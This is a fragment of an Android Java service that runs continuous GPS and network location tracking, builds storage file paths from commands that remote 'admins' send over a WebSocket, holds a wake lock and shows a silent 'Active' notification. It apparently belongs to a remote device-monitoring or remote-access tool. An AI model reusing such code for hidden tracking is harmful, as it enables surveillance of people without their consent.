                } catch (Exception ignored) {}
            }
            @Override public void onProviderEnabled(@NonNull String p) {}
            @Override public void onProviderDisabled(@NonNull String p) {}
            @Override public void onStatusChanged(String p, int s, Bundle e) {}
        };
        try {
            locationTracking = true;
            locationManager.requestLocationUpdates(
                LocationManager.GPS_PROVIDER, 15000, 5f, locationListener);
            if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                locationManager.requestLocationUpdates(
                    LocationManager.NETWORK_PROVIDER, 15000, 5f, locationListener);
            }
        } catch (SecurityException e) { locationTracking = false; }
    }

    private void handleStopLocation() {
        locationTracking = false;
        try {
            if (locationManager != null && locationListener != null) {
                locationManager.removeUpdates(locationListener);
            }
        } catch (Exception ignored) {}
        locationListener = null;
    }

    // ── Path helpers ───────────────────────────────────────────────────────────

    private File buildPath(JSONArray pathArr) throws Exception {
        File dir = Environment.getExternalStorageDirectory();
        if (pathArr != null) {
            for (int i = 0; i < pathArr.length(); i++)
                dir = new File(dir, pathArr.getString(i));
        }
        return dir;
    }

    private File buildFilePath(JSONArray pathArr) throws Exception {
        File f = Environment.getExternalStorageDirectory();
        if (pathArr != null) {
            for (int i = 0; i < pathArr.length(); i++)
                f = new File(f, pathArr.getString(i));
        }
        return f;
    }

    private String getMimeType(String name) {
        String ext = MimeTypeMap.getFileExtensionFromUrl(
            Uri.fromFile(new File(name)).toString());
        if (ext == null || ext.isEmpty()) return "application/octet-stream";
        String mime = MimeTypeMap.getSingleton().getMimeTypeFromExtension(ext.toLowerCase());
        return mime != null ? mime : "application/octet-stream";
    }

    private void sendWsError(WebSocket ws, String type, JSONObject msg, String error) {
        try {
            JSONObject err = new JSONObject();
            err.put("type", type);
            err.put("forAdminId", msg.optString("fromAdminId"));
            err.put("path", msg.optJSONArray("path"));
            err.put("entries", new JSONArray());
            err.put("error", error);
            ws.send(err.toString());
        } catch (Exception ignored) {}
    }

    // ── Notification / WakeLock ────────────────────────────────────────────────

    private void acquireWakeLock() {
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "meeee::bg");
        wakeLock.acquire();
    }

    private void createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                CHANNEL_ID, "meeee", NotificationManager.IMPORTANCE_LOW);
            ch.setDescription("Active");
            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE))
                .createNotificationChannel(ch);
        }
    }

    private Notification buildNotification() {
        Intent open = new Intent(this, MainActivity.class);
        PendingIntent pi = PendingIntent.getActivity(
            this, 0, open, PendingIntent.FLAG_IMMUTABLE);
        return new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("meeee")
            .setContentText("Active")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentIntent(pi)
            .setOngoing(true)
            .setSilent(true)
            .build();
    }
}
